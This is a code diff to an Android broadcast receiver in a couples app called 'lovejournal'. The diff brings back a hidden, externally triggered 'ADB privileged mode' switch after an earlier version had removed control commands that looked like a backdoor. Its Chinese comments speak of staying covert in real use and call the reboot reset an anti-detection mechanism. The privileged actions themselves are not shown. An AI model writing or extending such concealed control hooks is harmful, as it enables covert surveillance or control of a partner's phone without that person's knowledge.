@@ -6,7 +6,6 @@ import android.content.Intent
 import android.widget.Toast
 import cn.xtay.lovejournal.net.NetworkClient
 import cn.xtay.lovejournal.net.WebSocketManager
-import cn.xtay.lovejournal.util.UserPrefs
 import org.json.JSONObject
 import retrofit2.Call
 import retrofit2.Callback
@@ -15,17 +14,31 @@ import retrofit2.Response
 class ExternalCommandReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
-        // 核对暗号前缀
-        if (intent.action != "cn.xtay.lovejournal.ACTION_EXTERNAL_CMD") return
+        val prefs = context.getSharedPreferences("love_journal_prefs", Context.MODE_PRIVATE)
 
-        // 获取具体指令
-        val command = intent.getStringExtra("cmd") ?: return
+        when (intent.action) {
+            // 🚀 1. 监听 ADB 专属特权暗号
+            "cn.xtay.lovejournal.ACTION_SET_ADB_MODE" -> {
+                val isEnable = intent.getBooleanExtra("enable", false)
+                prefs.edit().putBoolean("is_adb_mode", isEnable).apply()
+                // 可选：给自己弹个Toast确认命令生效了，实战时可以删掉这行保持隐蔽
+                // Toast.makeText(context, "ADB特权模式: $isEnable", Toast.LENGTH_SHORT).show()
+            }
 
-        // 🛡️ 安全净化：只保留发射爱心的功能，干掉所有可能被杀毒软件误判为后门的控制指令
-        when (command) {
-            "fly_heart" -> handleFlyHeart(context)
-            else -> {
-                // 收到其他指令一律静默丢弃，绝不执行任何静默修改操作
+            // 🛡️ 2. 监听手机重启广播：反侦察机制，重启自动销毁特权！
+            Intent.ACTION_BOOT_COMPLETED -> {
+                prefs.edit().putBoolean("is_adb_mode", false).apply()
+            }
+
+            // 💖 3. 处理原有的外部指令 (爱心发射等)
+            "cn.xtay.lovejournal.ACTION_EXTERNAL_CMD" -> {
+                val command = intent.getStringExtra("cmd") ?: return
+                when (command) {
+                    "fly_heart" -> handleFlyHeart(context)
+                    else -> {
+                        // 收到其他指令一律静默丢弃
+                    }
+                }
             }
         }
     }
